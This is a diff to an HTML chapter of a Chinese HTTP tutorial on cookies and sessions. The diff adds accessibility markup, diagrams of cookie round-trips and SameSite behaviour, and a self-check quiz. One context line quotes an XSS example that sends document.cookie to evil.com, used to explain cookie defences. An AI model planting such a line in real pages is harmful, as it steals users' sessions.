@@ -131,10 +131,11 @@
     <link rel="stylesheet" href="theme.css">
 </head>
 <body>
+<a class="skip-link" href="#content">跳转至正文</a>
 <div class="double-border">
 <div class="container">
-    <div class="sidebar">
-        <h3>🌐 课程目录</h3>
+    <nav class="sidebar" aria-label="课程目录">
+        <p class="sidebar-title">🌐 课程目录</p>
         <ul class="chapter-list">
             <li><a href="01.html">第1章 HTTP协议概述</a></li>
 <li><a href="02.html">第2章 URL与资源定位</a></li>
@@ -145,7 +146,7 @@
 <li><a href="07.html">第7章 MIME类型与内容协商</a></li>
 <li><a href="08.html">第8章 连接管理</a></li>
 <li><a href="09.html">第9章 HTTP缓存</a></li>
-<li><a href="10.html" class="active">第10章 Cookie与会话</a></li>
+<li><a href="10.html" class="active" aria-current="page">第10章 Cookie与会话</a></li>
 <li><a href="11.html">第11章 HTTP认证</a></li>
 <li><a href="12.html">第12章 跨域资源共享(CORS)</a></li>
 <li><a href="13.html">第13章 内容编码与传输</a></li>
@@ -165,15 +166,18 @@
 <li><a href="27.html">第27章 HTTP/3 (QUIC)</a></li>
 <li><a href="28.html">第28章 HTTP项目实战</a></li>
         </ul>
-    </div>
-    <div class="main-content">
-        <h2>第十章：Cookie与会话</h2>
+    </nav>
+    <main class="main-content" id="content"><article>
+        <header class="article-header">
+            <h1 id="ch-title">第十章：Cookie与会话</h1>
+            <p class="dek">Set-Cookie / Cookie 往返、SameSite / HttpOnly / Secure 属性、服务端 Session，以及 Cookie 相关的安全防线。</p>
+        </header>
 
         <p>各位同学好。我们以前反复提到HTTP是"无状态"（stateless）的协议——服务器不会记住你之前的请求。但你在淘宝上逛了一圈，购物车里的商品一直都在；你登录了一次Gmail，邮件页面就认识你。这是怎么做到的？答案就是<strong>Cookie</strong>。</p>
 
         <p>Cookie是HTTP协议中为"无状态"这个天生缺陷打上的补丁。虽然设计上不算优雅，但它支撑了Web从文档分享平台到复杂应用平台的跨越。今天我们就把Cookie和相关会话机制讲透。</p>
 
-        <h3>10.1 Cookie的由来</h3>
+        <h2>10.1 Cookie的由来</h2>
 
         <p>Cookie是Netscape公司在1994年发明的。当时Netscape的工程师Lou Montulli需要解决一个问题：用户在Netscape的电商网站上，把商品加入购物车后，如果跳转到其他页面，购物车数据就丢了——因为服务器记不住你。</p>
 
@@ -194,11 +198,28 @@
 
         <p>这个机制简单但有效——它利用现有的请求-响应模型，在HTTP头部中传递状态信息。原名叫"Magic Cookie"（程序员的幽默），后来就被简称为Cookie了。</p>
 
+        <figure>
+          <svg role="img" aria-labelledby="fig-ch10-flow-title fig-ch10-flow-desc" viewBox="0 0 880 300" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI','PingFang SC',system-ui,sans-serif">
+            <title id="fig-ch10-flow-title">Cookie 的设置与回传流程</title>
+            <desc id="fig-ch10-flow-desc">首次请求时服务器通过 Set-Cookie 下发 session_id，浏览器保存；后续请求浏览器自动在 Cookie 头中回传该值，服务器据此识别用户。</desc>
+            <rect x="0" y="0" width="880" height="300" fill="#ffffff"/>
+            <rect x="60" y="40" width="200" height="56" rx="10" fill="#6366f1"/><text x="160" y="74" fill="#ffffff" text-anchor="middle" font-weight="700" font-size="15">浏览器</text>
+            <rect x="620" y="40" width="200" height="56" rx="10" fill="#10b981"/><text x="720" y="74" fill="#ffffff" text-anchor="middle" font-weight="700" font-size="15">服务器</text>
+            <defs><marker id="ch10-a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4338ca"/></marker><marker id="ch10-b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#047857"/></marker></defs>
+            <line x1="262" y1="80" x2="618" y2="80" stroke="#4338ca" stroke-width="2.5" marker-end="url(#ch10-a)"/><text x="440" y="72" font-size="13" fill="#4338ca" text-anchor="middle">① GET /index.html</text>
+            <line x1="618" y1="124" x2="262" y2="124" stroke="#047857" stroke-width="2.5" marker-end="url(#ch10-b)"/><text x="440" y="116" font-size="13" fill="#047857" text-anchor="middle">② 200 OK · Set-Cookie: session_id=abc123</text>
+            <rect x="120" y="150" width="160" height="46" rx="9" fill="#eef2ff" stroke="#818cf8" stroke-dasharray="6 5"/><text x="200" y="179" fill="#4338ca" text-anchor="middle" font-size="13">浏览器存下 Cookie</text>
+            <line x1="282" y1="173" x2="614" y2="200" stroke="#4338ca" stroke-width="2.5" marker-end="url(#ch10-a)"/><text x="470" y="196" font-size="13" fill="#4338ca" text-anchor="middle">③ 后续请求自动带 Cookie: session_id=abc123</text>
+            <text x="440" y="268" font-size="13" fill="#94a3b8" text-anchor="middle">HTTP 仍是无状态的：Cookie 只是请求中附带的一段数据，服务器靠它“回忆”你是谁。</text>
+          </svg>
+          <figcaption><span class="fig-no">图 10.1</span>　Cookie 的往返：服务器用 Set-Cookie 下发标识，浏览器存储后自动在后续请求的 Cookie 头回传，服务器据此重建会话上下文。</figcaption>
+        </figure>
+
         <div class="highlight">
           <p><strong>核心认知</strong>：Cookie并没有改变HTTP的无状态本质——每个HTTP请求仍然是独立的。Cookie只是在请求中附带了一段数据，服务器通过读取这段数据来"回忆"你是谁。就好比你去健身房，每次刷手环进门，手环本身不储存你的信息，但前台系统通过手环ID查到你的会员信息。</p>
         </div>
 
-        <h3>10.2 Cookie属性详解</h3>
+        <h2>10.2 Cookie属性详解</h2>
 
         <p>一个Cookie不止有名字和值，还包含一系列控制其行为的属性：</p>
 
@@ -222,11 +243,39 @@
           <li><code>SameSite=None</code>：允许跨站请求携带Cookie，但必须同时设置 <code>Secure</code>（即仅在HTTPS下生效）。用于第三方Cookie场景。</li>
         </ul>
 
+        <figure>
+          <svg role="img" aria-labelledby="fig-ch10-ss-title fig-ch10-ss-desc" viewBox="0 0 860 270" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI','PingFang SC',system-ui,sans-serif">
+            <title id="fig-ch10-ss-title">SameSite 三档对跨站请求的影响</title>
+            <desc id="fig-ch10-ss-desc">Strict 下任何跨站请求都不携带 Cookie；Lax 下仅顶级导航（如链接 GET 跳转）携带，跨站 POST 与子资源不携带；None 下跨站请求均携带，但必须同时设置 Secure。</desc>
+            <rect x="0" y="0" width="860" height="270" fill="#ffffff"/>
+            <g font-size="14">
+              <text x="150" y="30" fill="#94a3b8" text-anchor="middle" font-size="13">跨站场景</text>
+              <text x="430" y="30" fill="#94a3b8" text-anchor="middle" font-size="13">顶级导航（链接 GET）</text>
+              <text x="600" y="30" fill="#94a3b8" text-anchor="middle" font-size="13">跨站 POST</text>
+              <text x="760" y="30" fill="#94a3b8" text-anchor="middle" font-size="13">iframe / 子资源</text>
+
+              <rect x="30" y="46" width="800" height="60" rx="10" fill="#f8faff" stroke="#c7d2fe"/>
+              <text x="150" y="82" fill="#4338ca" text-anchor="middle" font-weight="700">Strict</text>
+              <text x="430" y="82" fill="#b91c1c" text-anchor="middle" font-size="18">✗</text><text x="600" y="82" fill="#b91c1c" text-anchor="middle" font-size="18">✗</text><text x="760" y="82" fill="#b91c1c" text-anchor="middle" font-size="18">✗</text>
+
+              <rect x="30" y="114" width="800" height="60" rx="10" fill="#f8faff" stroke="#c7d2fe"/>
+              <text x="150" y="150" fill="#4338ca" text-anchor="middle" font-weight="700">Lax（默认）</text>
+              <text x="430" y="150" fill="#047857" text-anchor="middle" font-size="18">✓</text><text x="600" y="150" fill="#b91c1c" text-anchor="middle" font-size="18">✗</text><text x="760" y="150" fill="#b91c1c" text-anchor="middle" font-size="18">✗</text>
+
+              <rect x="30" y="182" width="800" height="60" rx="10" fill="#f8faff" stroke="#c7d2fe"/>
+              <text x="150" y="218" fill="#4338ca" text-anchor="middle" font-weight="700">None</text>
+              <text x="430" y="218" fill="#047857" text-anchor="middle" font-size="18">✓</text><text x="600" y="218" fill="#047857" text-anchor="middle" font-size="18">✓</text><text x="760" y="218" fill="#047857" text-anchor="middle" font-size="18">✓</text>
+            </g>
+            <text x="430" y="260" font-size="12.5" fill="#94a3b8" text-anchor="middle">✓ 携带 Cookie　✗ 不携带；None 必须同时设置 Secure（仅 HTTPS 生效）。</text>
+          </svg>
+          <figcaption><span class="fig-no">图 10.2</span>　SameSite 三档对比：Strict 最安全但跨站体验差；Lax 是默认值与安全/体验平衡点；None 需搭配 Secure 才能用于跨站。</figcaption>
+        </figure>
+
         <div class="warning">
           <p><strong>踩坑故事</strong>：2020年Chrome 80发布后，我们收到大量用户反馈"突然无法登录了"。排查发现：我们后端设置的Cookie没有明确指定SameSite属性，Chrome自动把它当作SameSite=Lax处理了。而我们的登录流程依赖一个第三方OAuth弹窗——弹窗是跨域的，所以Cookie发不过去。修复方案是在Cookie上显式设置 <code>SameSite=None; Secure</code>，让弹窗流程能正常传递Cookie。这次事故让我们团队深刻认识到：浏览器厂商的默认行为变化，真的能一夜之间搞崩你的系统。</p>
         </div>
 
-        <h3>10.3 Session机制</h3>
+        <h2>10.3 Session机制</h2>
 
         <p>Cookie本身最多存4KB数据，而且存在客户端，不适合存放大量业务数据。所以真正存储"用户状态"的地方是在服务器端——这就是<strong>Session</strong>（会话）。</p>
 
@@ -252,7 +301,7 @@
           <p><strong>面试常考题</strong>：Session和Cookie有什么区别？标准答案是——Cookie存储在客户端，Session存储在服务端。Session通常依赖Cookie来传递Session ID，但它们不是二选一的关系，Session是基于Cookie实现的上层抽象。</p>
         </div>
 
-        <h3>10.4 第三方Cookie</h3>
+        <h2>10.4 第三方Cookie</h2>
 
         <p>上面讨论的都是"第一方Cookie"——由你正在访问的网站设置的Cookie。而<strong>第三方Cookie</strong>是其他域名在当前页面设置的Cookie，最常见的就是广告追踪。</p>
 
@@ -271,7 +320,7 @@
           <p><strong>趋势分析</strong>：第三方Cookie的消亡是不可逆的趋势。如果你的业务依赖第三方Cookie做用户追踪（比如广告归因、跨站分析），你需要尽快迁移到替代方案——如Google的Topics API、第一方数据策略、服务器端追踪等。政策变化已经导致很多广告技术公司不得不彻底重构他们的追踪体系。</p>
         </div>
 
-        <h3>10.5 Cookie安全</h3>
+        <h2>10.5 Cookie安全</h2>
 
         <p>Cookie中往往包含Session ID甚至认证Token，是攻击者的首要目标。以下是Cookie安全的几个关键防线：</p>
 
@@ -316,13 +365,34 @@ fetch('https://evil.com/steal?cookie=' + document.cookie);</code></pre>
 
         <p>好了，第十章的内容就到这里。Cookie是HTTP从无状态走向"能记住你是谁"的关键机制，但它诞生于一个还不太注重安全的时代，所以我们需要现代的SameSite、HttpOnly、Secure等属性来弥补它的先天不足。下一章我们进入<strong>HTTP认证（Authentication）</strong>——在Cookie之外，HTTP协议还提供了哪些认证方式？Basic、Digest、Bearer Token、API Key……各有各的适用场景。</p>
 
+        <aside class="self-check">
+          <p class="q">自测：为什么不应把用户角色（如 <code>role=admin</code>）直接放进 Cookie？正确的做法是什么？</p>
+          <button type="button" class="reveal" aria-expanded="false" aria-controls="ch10-a1">显示答案</button>
+          <div class="answer" id="ch10-a1" hidden>
+            <p>Cookie 存储在客户端且可被用户修改，若未签名就完全信任，攻击者改一个字段即可提权。正确做法是：Cookie 中只放无意义的 Session ID，角色等权限数据存在服务端的 Session 中；若必须在 Cookie 中携带数据，则对其做签名校验，服务器拒绝未通过验证的内容。</p>
+          </div>
+        </aside>
+
         <div class="footer-nav">
             <a href="09.html">← 上一章</a>
             <a href="index.html">📖 返回目录</a>
             <a href="11.html">下一章 →</a>
         </div>
-    </div>
+    </article></main>
 </div>
 </div>
+<script>
+  (function () {
+    var btn = document.querySelector('.self-check .reveal');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var ans = document.getElementById(btn.getAttribute('aria-controls'));
+      var open = btn.getAttribute('aria-expanded') === 'true';
+      btn.setAttribute('aria-expanded', String(!open));
+      ans.hidden = open;
+      btn.textContent = open ? '显示答案' : '收起答案';
+    });
+  })();
+</script>
 </body>
 </html>
